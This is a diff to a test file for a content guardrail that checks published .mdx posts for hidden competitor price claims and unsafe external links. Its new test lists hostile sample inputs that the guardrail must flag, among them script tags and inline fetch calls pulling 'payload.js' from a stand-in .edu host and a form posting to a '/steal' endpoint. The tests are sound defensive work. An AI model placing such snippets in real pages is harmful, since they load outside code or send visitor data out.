@@ -2440,6 +2440,10 @@ describe('third-party price citations + citation-grade TLDs (owner ruling 2026-0
       // Natively hidden containers need no hidden/style/class attribute.
       '<dialog>Other companies charge</dialog> $89 per visit for local quarterly service.',
       '<datalist>Other companies charge</datalist> $89 per visit for local quarterly service.',
+      // <details> is collapsed unless `open`.
+      '<details>Other companies charge</details> $89 per visit for local quarterly service.',
+      // Deleted text is not an affirmative attribution.
+      '~~Other companies charge~~ $89 per visit for local quarterly service.',
       '{show && "Orkin charges a"} $89 per visit',
       '<span hidden><span>x</span>Orkin charges a</span> $89 per visit',
       '<span style="display:none">Orkin charges a</span> $89 per visit',
@@ -2736,6 +2740,28 @@ describe('third-party price citations + citation-grade TLDs (owner ruling 2026-0
       {},
     );
     expect(r.findings.some((f) => f.code === 'DISALLOWED_EXTERNAL_LINK' && f.severity === 'P0')).toBe(true);
+  });
+
+  test('citation-grade TLDs are for PASSIVE links only (r11)', () => {
+    // Posts publish as executable .mdx, so a delegated .edu subdomain in an
+    // active resource position would become live third-party code.
+    const OPC = { operatorCitations: true, requiredSourceUrls: [] };
+    for (const body of [
+      '<script src="https://student.example.edu/payload.js"></script>',
+      '<iframe src="https://student.example.edu/x"></iframe>',
+      // Enumerating active positions missed these; the rule is an allowlist.
+      '<script is:inline>fetch("https://student.example.edu/payload.js")</script>',
+      '<form action="https://student.example.edu/steal"></form>',
+      '<a ping="https://student.example.edu/track">x</a>',
+      '{fetch("https://student.example.edu/payload.js")}',
+      '<Comp src={"https://student.example.edu/x"} />',
+    ]) {
+      expect(guardrails._internals.externalLinkFinding(body, OPC)?.code).toBe('DISALLOWED_EXTERNAL_LINK');
+    }
+    // Passive citations are unaffected.
+    expect(guardrails._internals.externalLinkFinding('Per [the study](https://research.example.edu/paper), chinch bugs peak in July.', OPC)).toBeNull();
+    expect(guardrails._internals.externalLinkFinding('See https://www.epa.gov/pesticides for details.', OPC)).toBeNull();
+    expect(guardrails._internals.externalLinkFinding('See the study.\n\n[1]: https://research.example.edu/paper', OPC)).toBeNull();
   });
 
   test('only the exact .gov/.edu suffix qualifies — lookalikes still block', () => {
